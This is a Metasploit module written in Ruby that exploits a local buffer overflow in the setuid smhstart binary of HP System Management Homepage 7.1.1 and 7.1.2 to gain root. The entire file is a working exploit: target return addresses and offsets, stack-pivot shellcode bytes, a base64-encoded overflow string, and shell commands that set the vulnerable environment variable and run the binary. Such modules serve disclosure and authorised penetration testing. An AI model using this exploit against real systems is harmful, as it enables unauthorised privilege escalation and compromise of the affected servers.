require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/exe'
class Metasploit4 < Msf::Exploit::Local
include Msf::Exploit::EXE
include Msf::Post::File
include Msf::Post::Common
include Msf::Exploit::Local::Linux
def initialize(info={})
super( update_info( info, {
'Name' => 'HP System Management Homepage Local Privilege Escalation',
'Description' => %q{
Versions of HP System Management Homepage <= 7.1.2 include a setuid root
smhstart which is vulnerable to a local buffer overflow in SSL_SHARE_BASE_DIR
env variable.
},
'License' => MSF_LICENSE,
'Author' =>
[
'agix' # @agixid # Vulnerability discovery and Metasploit module
],
'Platform' => [ 'linux' ],
'Arch' => [ ARCH_X86 ],
'SessionTypes' => [ 'shell' ],
'Payload' =>
{
'Space' => 227,
'BadChars' => "\x00\x22"
},
'References' =>
[
['OSVDB', '91990']
],
'Targets' =>
[
[ 'HP System Management Homepage 7.1.1',
{
'Arch' => ARCH_X86,
'CallEsp' => 0x080c86eb, # call esp
'Offset' => 58
}
],
[ 'HP System Management Homepage 7.1.2',
{
'Arch' => ARCH_X86,
'CallEsp' => 0x080c8b9b, # call esp
'Offset' => 58
}
],
],
'DefaultOptions' =>
{
'PrependSetuid' => true
},
'DefaultTarget' => 0,
'DisclosureDate' => "Mar 30 2013",
}
))
register_options([
OptString.new("smhstartDir", [ true, "smhstart directory", "/opt/hp/hpsmh/sbin/" ])
], self.class)
end
def exploit
pl = payload.encoded
padding = rand_text_alpha(target['Offset'])
ret = [target['CallEsp']].pack('V')
exploit = pl
exploit << ret
exploit << "\x81\xc4\x11\xff\xff\xff" # add esp, 0xffffff11
exploit << "\xe9\x0e\xff\xff\xff" # jmp => begining of pl
exploit << padding
exploit_encoded = Rex::Text.encode_base64(exploit) # to not break the shell base64 is better
id=cmd_exec("id -un")
if id!="hpsmh"
fail_with(Exploit::Failure::NoAccess, "You are #{id}, you must be hpsmh to exploit this")
end
cmd_exec("export SSL_SHARE_BASE_DIR=$(echo -n '#{exploit_encoded}' | base64 -d)")
cmd_exec("#{datastore['smhstartDir']}/smhstart")
end
end
